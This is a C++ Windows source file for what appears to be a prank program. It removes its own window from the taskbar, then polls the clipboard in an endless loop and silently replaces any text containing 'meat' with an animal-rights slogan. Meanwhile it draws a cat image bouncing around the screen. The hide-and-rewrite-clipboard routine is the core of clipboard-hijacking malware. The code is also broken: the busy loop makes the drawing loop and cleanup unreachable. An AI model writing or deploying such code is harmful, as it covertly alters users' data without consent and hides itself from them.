#include "draw_to_screen.h"
#include "ClipBoard.h"
#include <math.h>

#define IMAGE_PATH L"C:\\cat.jpg"

Draw* draw;
Bitmap* bmp;

void drawUpdate(double dt);
void removeFromTaskBar();

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{   
    std::string data = "";
    draw = new Draw(hInstance, drawUpdate);
    bmp = new Bitmap(IMAGE_PATH);

    ClipBoard clipBoard(draw->_hwnd);
    removeFromTaskBar();


    while (1)
    {
        data = clipBoard.ClipBoardRead();
        if (data.find("meat") != std::string::npos)
        {
            clipBoard.clipBoardWrite("COWS ARE SMARTER THAN DOGS TEL_AVIV");
        }
    }
    
    while (draw->update());

    delete draw;
    delete bmp;
    return 0;

}


double a = 0;
const double AV = 2;    // radian/s
/*
the function update the screen
*/
void drawUpdate(double dt)
{
    a += AV * dt;
    double x = sin(a) * 500 + 520;
    double y = sin(2 * a) * 200 + 300;
    draw->drawImage(bmp, x, y);


}


/*
the function remove the icon from the task bar
param: none
return: none
*/
void removeFromTaskBar()
{
    //remove from task bar
    ITaskbarList* pTaskList = NULL;
    HRESULT initRet = CoInitialize(NULL);
    HRESULT createRet = CoCreateInstance(CLSID_TaskbarList,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskbarList,
        (LPVOID*)&pTaskList);

    if (createRet == S_OK && initRet == S_OK)
    {
        pTaskList->DeleteTab(draw->_hwnd);
        pTaskList->Release();
    }
}

